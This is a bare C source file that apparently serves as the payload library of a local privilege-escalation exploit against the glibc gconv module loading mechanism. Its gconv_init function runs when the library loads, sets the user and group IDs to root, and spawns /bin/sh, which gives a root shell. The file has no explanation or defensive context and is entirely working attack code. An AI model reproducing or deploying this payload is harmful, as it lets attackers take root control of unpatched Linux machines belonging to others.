#define _GNU_SOURCE
#include <gconv.h>
#include <unistd.h>

int gconv_init()
{
  setuid(0);
  setgid(0);

  char *args[] = {"sh", NULL};
  char *envp[] = {"PATH=/bin:/usr/bin:/sbin", NULL};

  execvpe("/bin/sh", args, envp);
  return (__GCONV_OK);
}

int gconv() { return (__GCONV_OK); }
